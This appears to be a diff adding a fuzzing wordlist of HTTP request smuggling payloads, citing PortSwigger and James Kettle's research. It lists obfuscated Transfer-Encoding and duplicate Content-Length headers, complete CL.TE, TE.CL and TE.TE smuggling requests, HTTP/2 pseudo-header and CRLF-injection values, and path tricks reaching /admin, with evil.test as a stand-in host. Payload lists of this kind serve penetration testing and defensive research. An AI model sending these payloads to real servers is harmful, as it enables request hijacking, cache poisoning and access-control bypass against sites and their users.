@@ -1,0 +1,129 @@
+# category: smuggling
+# description: HTTP request smuggling probes — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, prefix-based desync.
+# references: PortSwigger HTTP Request Smuggling research, James Kettle's "HTTP Desync Attacks".
+# notes: Each entry is annotated with "header: value" or a full request snippet. Combine with `combo --join '\r\n'` for request construction.
+
+# ── Header pairs: CL.TE (front-end CL, back-end TE) ─────────────────────────
+Content-Length: 13
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding:  chunked
+Transfer-Encoding:chunked
+Transfer-Encoding	: chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: x
+Transfer-Encoding: xchunked
+Transfer-Encoding: xchunked, chunked
+Transfer-Encoding : chunked, deflate
+Transfer-encoding: chunked
+transfer-encoding: chunked
+TRANSFER-ENCODING: chunked
+Transfer-Encoding: chunked;x=1
+Transfer-Encoding: chunked\r
+Transfer-Encoding:[chunked]
+Transfer-Encoding: "chunked"
+X-HTTP-Method-Override: POST
+
+# ── Dual-CL (CL.CL desync) ─────────────────────────────────────────────────
+Content-Length: 0
+Content-Length: 44
+Content-length: 3
+Content-Length: 11
+Content-length: 11
+Content-Length: 11
+Content-Length: 0\r\nContent-Length: 44
+
+# ── Hop-by-hop + Connection smuggling ──────────────────────────────────────
+Connection: close, X-Forwarded-For
+Connection: keep-alive, X-Forwarded-For
+Connection: X-Forwarded-For
+Connection: Content-Length
+Proxy-Connection: keep-alive
+
+# ── Front/Back-end rewrite primers (host/prefix) ───────────────────────────
+X-Forwarded-Host: evil.test
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Host: evil.test
+X-Forwarded-Server: evil.test
+X-Backend-Server: evil.test
+X-Forwarded-Proto: http
+
+# ── Full-body CL.TE probes (one per line, \r\n encoded literally) ──────────
+POST / HTTP/1.1\r\nHost: x.test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: x.test\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG
+POST / HTTP/1.1\r\nHost: x.test\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n
+
+# ── Full-body TE.CL probes ─────────────────────────────────────────────────
+POST / HTTP/1.1\r\nHost: x.test\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: x.test\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /404 HTTP/1.1\r\nHost: x.test\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n
+
+# ── TE.TE double-TE obfuscation ────────────────────────────────────────────
+POST / HTTP/1.1\r\nHost: x.test\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST /404 HTTP/1.1\r\n\r\n0\r\n\r\n
+
+# ── HTTP/2 downgrade primers (H2.CL, H2.TE) ────────────────────────────────
+:method POST + content-length: 0 + body on wire
+:method POST + transfer-encoding: chunked + body on wire
+:path /%2E%2E/admin
+:path /%2f..%2fadmin
+:scheme http (while served https)
+:authority evil.test (host mismatch)
+pseudo-header duplication: :path /a + :path /b
+
+# ── First-line / method mangling ───────────────────────────────────────────
+GET / HTTP/0.9
+GET / HTTP/1.0\r\n
+GET / HTTP/3.0\r\n
+GET /../admin HTTP/1.1
+GET /%2E%2E/admin HTTP/1.1
+GET /;.css HTTP/1.1
+GET /%00 HTTP/1.1
+GET /%20 HTTP/1.1
+POST / HTTP/1.1\nHost: x.test\n\n    (LF-only line endings)
+POST / HTTP/1.1\r\r\nHost: x.test\r\n\r\n  (bare CR)
+
+# ── Request-line smuggling via body prefix (G in CL.TE) ────────────────────
+GPOST / HTTP/1.1
+GGET / HTTP/1.1
+0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x.test\r\n\r\n
+
+# ── HTTP/2 specific (:authority / :method / :path confusion) ─────────────
+:method CONNECT
+:method CONNECT /@evil.test:443
+:path ../admin
+:path /admin HTTP/1.1
+:authority evil.test#.example.com
+:authority evil.test\r\nHost: real.example.com
+:scheme http://evil.test
+:scheme https\r\n
+:path //example.com/x
+:path /x HTTP/1.1\r\nHost: evil.test\r\n
+
+# ── HPACK header-table confusion ─────────────────────────────────────────
+Cookie: smug=1\r\nCookie: real=2
+cookie: a; cookie: b; cookie: c
+Set-Cookie: a=1\r\nSet-Cookie: b=2
+Set-Cookie: a=1; Secure
+Set-Cookie: a=1; HttpOnly
+Set-Cookie: a=1; SameSite=None
+
+# ── CL.0 (zero-content-length) smuggling ─────────────────────────────────
+Content-Length: 00
+Content-Length: 0x0
+Content-Length:  0
+
+# ── Chunked extension / trailing-headers abuse ───────────────────────────
+Trailer: X-Injected
+Trailer: Cookie
+Transfer-Encoding: chunked;x
+0\r\n\r\n
+0\r\nX-Injected: value\r\n\r\n
+10;token=x\r\nAAAAAAAAAAAAAAAA\r\n0\r\n\r\n
+
+# ── Line-ending abuse ────────────────────────────────────────────────────
+Content-Length: 5\r\n\rTransfer-Encoding: chunked\r\n\r\n
+Content-Length: 5 \r\nTransfer-Encoding: chunked
+Content-Length:\t5\r\nTransfer-Encoding: chunked
+Content-Length\n: 5\r\nTransfer-Encoding: chunked
